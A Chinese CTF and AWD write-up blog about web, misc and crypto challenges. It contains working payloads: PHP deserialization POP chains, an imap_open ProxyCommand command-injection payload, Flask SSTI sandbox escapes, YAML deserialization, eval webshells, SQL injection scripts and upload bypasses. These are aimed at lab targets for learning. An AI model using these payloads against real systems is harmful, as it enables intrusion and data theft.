(\"企鹅\",\"青蛙\",\"油漆\",\"花旗参\",\"救生圈\",\"油漆\",\"二胡\",\"二石\",\"漏斗\",\"二石\",\"二石\",\"冰淇淋\",\"漏斗\",\"喇叭\",\"油漆\",\"冰淇淋\",\"鹅卵石\",\"21世纪\",\"耳机\",\"油漆\",\"耳机\",\"二石\",\"二胡\",\"耳机\",\"21世纪\",\"企鹅\",\"二流子\",\"二石\",\"要发\",\"二石\",\"冰淇淋\",\"冰淇淋\",\"油漆\",\"冰淇淋\",\"企鹅\",\"乔丹\",\"二石\",\"酒壶\")dic = &#123;\"企鹅\":72,\"青蛙\":78,\"油漆\":67,\"花旗参\":73,\"救生圈\":93,\"二胡\":25,\"二石\":20,\"漏斗\":69,\"喇叭\":68,\"冰淇淋\":70,\"鹅卵石\":24,\"21世纪\":21,\"耳机\":27,\"二流子\":26,\"要发\":18,\"乔丹\":23,\"酒壶\":95&#125;nums = \"\"for item in cipher: temp = dic.get(item) nums += str(temp)flag = \"\"for i in range(len(nums)//2): flag += chr(int(nums[2*i:2*i+2])+30)print(flag) 12月月赛 MISC 签到题 关注公主号，回复flag会返回一个问题 什么牛不会跑 ，答案是 蜗牛 ,然后即可得到flag 学习资料 尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。 变换的指纹 用CSDN密码库密码爆破。我失败了，看了别人的密码!(()!@)6125dou（注意结尾的空格），之后即可得到压缩包， 23685528276158852365572716835687172857481317 JUJU 题目提示了说11只JUJU，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度 然后即可看到类似base64编码的字符串MZWGCZ33GQZTQMTEM5SGMMTEPU====，但是解码失败，尝试后发现是base32编码的，解密即可得到flagflag{4382dgdf2d} 菜刀666 先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字well,you need passwd!，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片 打开图片即可看到密码，解压即可看到flag WEB easy 代码审计，关键过滤如下 1preg_match('/[oc]:\\d+:/i',$data,$matches); 可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 + 绕过 o:14 -&gt; o:+14 1234567891011121314151617181920&lt;?php @error_reporting(1);class baby &#123; public $file; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = \"./&#123;$this-&gt;file&#125;\"; if (file_get_contents($filename)) &#123; return file_get_contents($filename); &#125; &#125; &#125; &#125; $data = new baby();$data-&gt;file = \"flag.php\";print(serialize(($data)));//给输出加一个加号在url编码一下 payload 1http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;?data&#x3D;O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D ezweb2 既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 you are not admin. ，查看cookie发现user值为user的base64值，我们将此值修改为 admin 的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过cat$IFS/ffLAG_404 ，然后即可成功绕过 1月月赛 web babygo 代码审计题目 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556@error_reporting(1); include 'flag.php';class baby &#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class cool &#123; public $filename; public $nice; public $amzing; function read() &#123; $this-&gt;nice = unserialize($this-&gt;amzing); $this-&gt;nice-&gt;aaa = $sth; if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125; &#125; class sec &#123; function read() &#123; return \"it's so sec~~\"; &#125; &#125; if (isset($_GET['data'])) &#123; $Input_data = unserialize($_GET['data']); echo $Input_data; &#125; else &#123; highlight_file(\"./index.php\"); &#125; 题目考察pop链的构造，核心点在于 12$this-&gt;nice-&gt;aaa = $sth;if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb) 代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值 构造pop链如下 12345678910111213141516171819error_reporting(1);class baby &#123; protected $skyobj; public $aaa; public $bbb; function __construct() &#123; $this-&gt;skyobj = new cool(); &#125; &#125; class cool &#123; public $filename = \"flag.php\"; public $nice; public $amzing = 'O:4:\"baby\":3:&#123;s:9:\" * skyobj\";N;s:3:\"aaa\";s:4:\"snow\";s:3:\"bbb\";R:3;&#125;'; &#125; $b = new baby();echo urlencode(serialize($b)); 1data&#x3D;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;%00%2A%00skyobj&quot;%3BO%3A4%3A&quot;cool&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A4%3A&quot;nice&quot;%3BN%3Bs%3A6%3A&quot;amzing&quot;%3Bs%3A68%3A&quot;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;+%2A+skyobj&quot;%3BN%3Bs%3A3%3A&quot;aaa&quot;%3Bs%3A4%3A&quot;snow&quot;%3Bs%3A3%3A&quot;bbb&quot;%3BR%3A3%3B%7D&quot;%3B%7Ds%3A3%3A&quot;aaa&quot;%3BN%3Bs%3A3%3A&quot;bbb&quot;%3BN%3B%7D 查看源代码即可得到flag 123&lt;?php// $flag = 'flag&#123;bd75a38e62ec0e450745a8eb8e667f5b&#125;';$sth='test5030b66d4bdtest35daed9d51e2688377299test'; MISC zhunianjixiang 题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下 1foremost zhu.jpg 然后即可得到一张二维码，扫描一下 看来还有其他东西，stegsolve上查看一下得到flag 1flag&#123;You_ARE_SOsmart&#125; CRYPTO 真的是键盘吗 ypau_kjg;”g;”ypau+ 题目的提示不好，原题目的提示是键盘之争，百度一下即可发现是考察键盘的两种布局方式链接，按照两种方式一一对应即可 12345678QWERTY = ['q','w','e','r','t','y','u','i','o','p','&#123;','&#125;','|','a','s','d','f','g','h','j','k','l',';','\"','z','x','c','v','b','n','m','&lt;','&gt;','?','_','+']Dvorak = ['\"','&lt;','&gt;','p','y','f','g','c','r','l','?','+','|','a','o','e','u','i','d','h','t','n','s','_',';','q','j','k','x','b','m','w','v','z','&#123;','&#125;']dic = dict(zip(QWERTY,Dvorak))flag = ''s = 'ypau_kjg;\"g;\"ypau+'for i in s: flag += dic[i]print(flag) flag{this_is_flag} get it Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。 Eve窃听到这样一段内容，主要内容如下：p = 37A = 17B = 31 U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0OK4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb627oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZwHkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpKix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXlVwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6m5lSYiFFd0E= 分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。 而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。 例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为： password = hashlib.md5(“(3,6,35)”).hexdigest()[0:16] 二月月赛 WEB 注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置上传测试可以发现文件会被强制命名为用户名.jpg，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为 1imap_open(string $mailbox, string $username, string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] ) : resource 漏洞在于$mailbox，用docker来测试一下 1234docker search imapdocker pull fedosov&#x2F;docker-php-imap-composerdocker run -itd fedosov&#x2F;docker-php-imap-composer &#x2F;bin&#x2F;bashdocker attach id 写入一个实现漏洞测试函数12345&lt;?php$payload = \"echo skysky|tee /tmp/success\";$encoded_payload = base64_encode($payload);$server = \"any -o ProxyCommand=echo\\t\".$encoded_payload.\"|base64\\t-d|bash\";@imap_open('&#123;'.$server.'&#125;:143/imap&#125;INBOX', '', ''); 在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件， 但是实际操作失败了，不知道原因为何。 MISC 非常简单的流量分析 1http contains &quot;robots.txt&quot; 追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容 md5 0x99a98e067af6b09e64f3740767096c96 DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d (129-&gt;143) DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b (143-&gt;129) 当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包 按照配置网上的思路配置一下esp秘钥，依次选择编辑-&gt;首选项-&gt;Protocols-&gt;ESP 添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值 之后即可得到解密报文 发现http报文有点特殊 可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下 123456789import rewith open('2.txt','r') as f: content = f.read() flag = '' par = re.findall(r'include/information/.*_(.*)\\.php',content) for i in par: flag += chr(int(i)) print(flag) flag：flag{27b03b758f255276e5a98da0e1947bed}","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"应急挑战杯2019复现","slug":"YJTZB2019","date":"2020-09-13T12:18:00.000Z","updated":"2020-09-13T12:20:03.190Z","comments":true,"path":"2020/09/13/YJTZB2019/","link":"","permalink":"http://chaosec.top/2020/09/13/YJTZB2019/","excerpt":"历史文章补发 前言 第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下","text":"历史文章补发 前言 第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下 Flask商城 popen()命令执行 在search路由处存在命令执行漏洞 12345678if request.method == \"POST\": url = request.form['search'] msg = os.popen(url).read() if not msg == '': return render_template(\"search.html\", msg=msg) else: return render_template(\"search.html\", msg=\"Error.Check your command.\") 非常明显的一个命令执行，popen函数用于从一个命令打开一个管道，会返回一个文件对象，所以可以被用来执行任意系统命令，由于比赛使用的gunicorn服务器，很多人修了洞之后却无法生效（因为没有重启gunicorn服务…） SSTI漏洞 在定义404返回的路由处存在ssti123456789101112@app.errorhandler(404)def page_not_found(e): template = ''' &#123;%% block body %%&#125; &lt;div class=\"center-content error\"&gt; &lt;h1&gt;哇哦，This page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;h3&gt;这里什么都没有呢٩(๑❛ᴗ❛๑)۶&lt;/h3&gt; &lt;/div&gt; &#123;%% endblock %%&#125; ''' % (request.url) return render_template_string(template), 404 找到SSTI漏洞，接下来就是沙盒逃逸，可用payload如下： 1&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;)&#39; 实例调用__class__属性时会指向该实例所对应的类；由于python允许多重继承，__mro__可以得到该类继承的父类，builtins是解释器自动导入的内置类，__import__()函数能够动态导入一些类从而进行命令执行 由于flask使用的模板渲染引擎是jinja2，所以payload还可以更简单一些，我们其实随便输入字符串都是有用的，jinja会生成一个undefined类&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;，我们可以直接进行逃逸 1vvv.__class__.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;cat &#x2F;flag &gt; &#x2F;home&#x2F;snow&#x2F;sandbox&quot;)&#39;) yaml反序列化 yaml库在使用yaml.load()方法解析yaml文件时会存在反序列化漏洞，可以使用yaml.safe_load()方法来避免该漏洞 想要序列化的类名必须使用上下文中存在的类名，但是类名中不一定有执行命令的相应方法，所以最好是通过构造标准类或类函数来实现命令执行，编辑如下文件并上传即可 123*-* exp.yml *-*!!python&#x2F;object&#x2F;new:subprocess.check_output [[&quot;cat&quot;,&quot;&#x2F;flag&quot;]] easyweb 1、 反序列化 反序列化漏洞有两处 第一处在首页存在提示 定位到cacf.php，查看代码，可以通过反序列化进行文件写入123456789class chybeta&#123; // var $test = 'pcaq'; function __wakeup()&#123; $fp = fopen(\"log.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125; 反序列化写入shell12345678&lt;?php class chybeta&#123; // var $test = '&lt;?php eval($_GET[\"snow\"]);?&gt;';&#125;$a = new chybeta();$a = serialize($a);echo $a; 第二处在common/home.php中 123456789101112131415161718192021222324252627282930313233class home&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"ping\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; function ping($host)&#123; system(\"ping -c 2 $host\"); &#125; function waf($str)&#123; $str=str_replace(' ','',$str); return $str; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim(mysql_escape_string($v))); &#125; &#125; &#125;$a=@$_POST['a'];@unserialize(base64_decode($a)); 在析构函数中通过调用ping函数可以实现命令执行，但是在waf函数中屏蔽了空格，用$IFS可以绕过 12345678910111213class home&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125;&#125;$arr = array(\"127.0.0.1;cat\\$IFS/flag\");$obj = new home(\"ping\" ,$arr);$obj = serialize($obj);$obj = base64_encode($obj);echo $obj; 2、万能密码 登录处存在sql注入 1$sql=\"select * from users where username='$username' and password='$password'\"; 可以通过万能密码登录 密码更新处同样也存在update注入 1$sql=\"update users set password='$password' where id='\".$_SESSION['id'].\"';\"; 3、命令执行 在User.php中存在ping函数可以进行命令执行 1234function ping()&#123; $host = $_POST['host']; system(\"ping -c $host\"); &#125; 4、预置后门 预置后门有两个，一个在include/shell.php 12&lt;?php@eval($_POST['admin_ccmd']); 另一个在org/smarty/Autofoucer.php 5、日志文件写入 根目录下log.php会记录网站访问记录，可以通过构造恶意访问写入shell 6、上传漏洞 登录之后存在上传界面，查看上传逻辑代码 12345678$this-&gt;notallow=array(\"php\", \"php5\", \"php3\", \"php4\", \"php7\", \"pht\", \"phtml\", \"htaccess\",\"html\", \"swf\", \"htm\");function save()&#123; $id=$_SESSION['id']; $upfile=$_FILES['pic']; $fileinfo=pathinfo($upfile[\"name\"]); if(in_array($fileinfo[\"extension\"],$this-&gt;notallow))&#123; exit('error');&#125; 没有对大小写进行过滤，可以构造恶意文件上传 Thinkphp5 公开CVE，略 reference：https://xz.aliyun.com/t/52https://xz.aliyun.com/t/2908#toc-0","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"http://chaosec.top/tags/AWD/"}]},{"title":"BUUCTF_WEB(一)","slug":"buuctf","date":"2020-04-02T10:43:19.000Z","updated":"2020-04-02T15:04:16.692Z","comments":true,"path":"2020/04/02/buuctf/","link":"","permalink":"http://chaosec.top/2020/04/02/buuctf/","excerpt":"今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~","text":"今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~ [极客大挑战 2019]EasySQL 简单的万能密码即可登录 1http:&#x2F;&#x2F;b8506b10-95f5-4f01-b77a-8485ee19e068.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27+or+1%23&amp;password&#x3D;fads [极客大挑战 2019]Havefun 签到题，查看网页源代码 1234567&lt;!-- $cat=$_GET['cat']; echo $cat; if($cat=='dog')&#123; echo 'Syc&#123;cat_cat_cat_cat&#125;'; &#125; --&gt; 然后提交get参数cat=dog即可getflag [极客大挑战 2019]FinalSQL 本题是一个数字型注入，注入点在id参数，过滤了部分敏感词，如and，空格等，使用异或符号可以正常返回数据 1id&#x3D;0^(1) 所以可以据此进行盲注，但是题目过滤了空格，经过尝试发现空格无法用特殊字符绕过，不过此处可以使用无空格方式来注入，即通过括号包裹来避免使用空格，比如：1select(*)from(admin); 盲注脚本如下 1234567891011121314151617181920212223import requestsimport stringbase_url = 'http://33afb64c-ecb9-427b-b24e-100dbb7dd810.node3.buuoj.cn/search.php'ws = string.printable[:-6]sign = \"NO! Not this\"table_name = \"F1naI1y,Flaaaaag\"# column_name = 'id,fl4gawsl' Flaaag# column_name = 'id,username,password'column_name = 'mygodcl4y_is_really_amazing,welco'while True: for i in ws: # payload1 = \"?id=0^(select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)\"\\ # \"where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;))\" # payload2 = \"?id=0^(select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)\"\\ # \"where(table_name='F1naI1y')),&#123;&#125;,1))=&#123;&#125;))\" payload2 = \"?id=0^(select(ascii(substr((select(group_concat(username,password))from(F1naI1y)),&#123;&#125;,1))=&#123;&#125;))\" res = requests.get(base_url + payload2.format(len(column_name)+1, ord(i))).content.decode('utf-8') if sign in res: column_name += i print(column_name) break 不得不吐槽一下的是flag所在表数据真的有点长，我都怀疑flag是不是不在这个表里面，如果只跑password字段的话应该会短一点 [极客大挑战 2019]Secret File 打开网站之后查看源代码可以看到提示1&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;访问Archive_room.php，题目提示没看清么？请回去仔细看看，应该是发生了跳转，抓包，发现了新的页面secr3t.php，访问得到源代码1234567891011121314&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag放在了flag.php里?&gt;然后就是文件包含1http:&#x2F;&#x2F;a74e337d-43ce-4de5-af4a-08d701cec8b1.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php解码即可得到flag [极客大挑战 2019]PHP 题目提示了网站备份，随手测试www.zip可以down到源码查看index.php发现存在反序列化12345&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt;查看class.php12345678910111213141516171819202122232425262728293031include 'flag.php';error_reporting(0);class Name&#123; private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = 'guest'; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); &#125; if ($this-&gt;username === 'admin') &#123; global $flag; echo $flag; &#125;else&#123; echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); &#125; &#125;&#125;很简单的反序列化，username为admin且password为100即可getflag，只需要绕过一下wakeup函数即可123456789101112class Name&#123; private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125;&#125;$obj = new Name('admin',100);$obj = serialize($obj);$obj = str_replace(':2:', ':3:', $obj);echo urlencode($obj);payload:1O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D [极客大挑战 2019]Knife 题目直接给出了shelleval($_POST[&quot;Syc&quot;]);然后直接读flag就行了 [极客大挑战 2019]LoveSQL 题目毫无过滤，直接一把梭就行了，payload如下：1view-source:http:&#x2F;&#x2F;4616398c-abd6-4030-87b8-27d8abd6fd4c.node3.buuoj.cn&#x2F;check.php?username&#x3D;adin%27union%20select%201,(select%20group_concat(password)%20from%20l0ve1ysq1),3%23&amp;password&#x3D;addmin [极客大挑战 2019]Http 修改指定http头即可 [极客大挑战 2019]BabySQL 过滤了or,and,from,union,select,where等字符，可以通过双写绕过，payload1view-source:http:&#x2F;&#x2F;39ae0ce7-baa4-43ed-9adf-df019b95a001.node3.buuoj.cn&#x2F;check.php?username&#x3D;0&#39; uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frfromom b4bsql),3-- +&amp;password&#x3D;456 [极客大挑战 2019]BuyFlag 题目Attention给出提示 If you want to buy the FLAG:You must be a student from CUIT!!!You must be answer the correct password!!! 同时view-source存在源码1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST['password'])) &#123; $password = $_POST['password']; if (is_numeric($password)) &#123; echo \"password can't be number&lt;/br&gt;\"; &#125;elseif ($password == 404) &#123; echo \"Password Right!&lt;/br&gt;\"; &#125;&#125;--&gt;也就是说，得到flag需要达到三个条件 是CUIT’s student 正确的密码 足够的money 查看返回头可以看到存在cookieuser=0，猜测可能是身份鉴别字段，修改值为1，这样就通过了CUIT的验证 you are CuiterPlease input your password!! password字段的验证绕过很简单，is_numeric存在截断漏洞，提交password=404%00aaa即可绕过 you are CuiterPassword Right!Pay for the flag!!!hacker!!! 然后提交金额100000000 you are CuiterPassword Right!Nember lenth is too long 数字过长可以使用科学计数法，提交money=1e9即可getflag [极客大挑战 2019]Upload 很简单的上传绕过，需要修改三个点 content-type: image/jpeg 修改文件后缀名为phtml 添加图片前缀GIF89a 使用标签&lt;script language=&quot;php&quot;&gt;&lt;/script&gt; 上传成功后需要猜测上传目录，实际上传目录为uploadgetflag payload：1http:&#x2F;&#x2F;2625763a-f599-4a0b-a1c7-1f9501ab20d2.node3.buuoj.cn&#x2F;upload&#x2F;shell.phtml?snow&#x3D;system(%27cat%20&#x2F;flag%27); [极客大挑战 2019]HardSQL 报错注入，过滤了空格，可以使用括号包裹绕过，=&lt;&gt;也被过滤了，可以使用in语句来绕过爆表1http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&amp;password&#x3D;admin H4rDsq1 1http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;admin XPATH syntax error: ‘~id,username,password~‘ 1http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin XPATH syntax error: ‘~flag{7ba38da2-8bbb-4d78-9c9d-6a’ 1http:&#x2F;&#x2F;398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin XPATH syntax error: ‘~a2-8bbb-4d78-9c9d-6abe9bc51c29}’ [极客大挑战 2019]RCE ME 考察命令执行，题目给出了代码12345678910111213error_reporting(0);if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die(\"This is too Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;参考P神的一篇博文无字母数字shell提高篇中提到一种方法，在PHP7中，可以使用($a)()来执行代码，比如使用(&#39;phpinfo&#39;)()可以执行phpinfo函数1php7 -r \"('phpinfo')();\"运行该命令可以看到成功打印PHP信息，不过在版本小于PHP7时是不可以的由于不允许出现数字字母，我们需要设法表示字母，可以使用~来实现，比如1php7 -r &quot;echo urlencode(~&#39;phpinfo&#39;);&quot; # 为了避免字符显示问题，所以进行了url编码然后运行123456789php7 -r &quot;(~urldecode(&#39;%8F%97%8F%96%91%99%90&#39;))();&quot;;phpinfo()PHP Version &#x3D;&gt; 7.0.12System &#x3D;&gt; Windows NT DESKTOP-S4PD6MS 10.0 build 17763 (Windows 10) i586Build Date &#x3D;&gt; Oct 13 2016 10:44:50Compiler &#x3D;&gt; MSVC14 (Visual C++ 2015)Architecture &#x3D;&gt; x86可以看到是可以运行的，提交该payload，可以看到phpinfo()执行结果，查看disable_functions选项常用命令执行函数被ban了，可以使用var_dump+scandir+file_get_contents组合拳来读取文件1234➜ php7 -r &quot;echo urlencode(~&#39;var_dump&#39;);&quot;%89%9E%8D%A0%9B%8A%92%8F➜ php7 -r &quot;echo urlencode(~&#39;scandir&#39;);&quot;%8C%9C%9E%91%9B%96%8Dpayload为(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27/%27));，相当于执行了var_dump(scandir(&#39;/&#39;));但是，接下来读取文件时却无法读取，应该是没有相应的权限，根目录下还有一个readflag文件，应该是要调用该程序读取flag这样的话需要我们进行绕过disable_functions进行提权，我们先尝试获取一个webshell 查看disable_functions可以看到assert没有被ban，可以尝试利用之官方文档中说，php7+版本中，assert不再作为函数而是作为一种语言结构，而且默认不能执行代码，不过，使用间接调用的方法却是可以当做函数执行的（不知道为啥），比如：1assert(var_dump('aaa'));该语句执行时无任何返回，我们使用间接的方式来执行：12$a = 'assert';$a(var_dump('aaa')); string(3) “aaa”PHP Warning: assert(): Assertion failed in /var/www/html/rce.php on line 4 此时成功执行 那么，我们就用此方法来getshell，payload如下：1code&#x3D;$&#123;~(%A0%B8%BA%AB)&#125;[_]($&#123;~(%A0%B8%BA%AB)&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[___]);然后使用蚁剑连接，蚁剑中正好有绕过disable_funcs的插件，直接用一下提权之后读flag PS：根据出题大佬的原意，第一步的getshell是希望我们实现无文件getshell，并且给出了payload12?code&#x3D;(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));&#x2F;&#x2F;(&quot;assert&quot;)((&quot;next&quot;)((&quot;getallheaders&quot;)()));然后通过UA头即可执行任意命令 PHP语言结构（language construct）： 语言结构与函数相比的一些特征： 很多不需要括号，有的会需要 一些语言结构，能够实现一些函数不可能完成的事情，比如isset，经常会访问一下不存在的变量，如果使用函数来实现会非常难; 一些语言结构与函数写法存在差异。例如，Array(…)结构可以写成[…] 正如文档不断提醒我们的，语言结构不能作为可变函数引用。即$a=&#39;print_r&#39;; $a(…);是可以的，而$a=&#39;print&#39;;$a(…);则不行，因为print_r是函数，而print是语言结构 [护网杯 2018]easy_tornado python模板注入题目，查看hint.txt可知题目需要知道文件名与签名，flag.txt中已给出了flag位置/fllllllllllllag，签名格式为 1md5(cookie_secret+md5(filename)) 所以此题目标就是要获取cookie_secret值，当签名错误后会报错，此报错页面存在模板注入 1http:&#x2F;&#x2F;c031cfdc-f167-430e-858a-52ddf7406018.node3.buuoj.cn&#x2F;error?msg&#x3D;Error 简单测试 通过hander对象来进行注入可以得到cookie 然后计算签名获得flag [SUCTF 2019]EasySQL 本题是数字型注入，测试过滤 发现题目可以进行堆叠注入，本来想利用execute来执行语句，但是过滤了prepare，根据探测发现目标表名为Flag 但是flag被过滤了，from字段也没法用，这里做到这儿就没思路了，查看资料发现解法是设置sql_mode，真的学到了 本题需要猜测后端的SQL语句，当输入0无数据返回，输入1会返回数据，所以后端可能是存在异或的 后端sql语句可能是 1$sql = \"select \".$query.\"||flag from Flag\"; 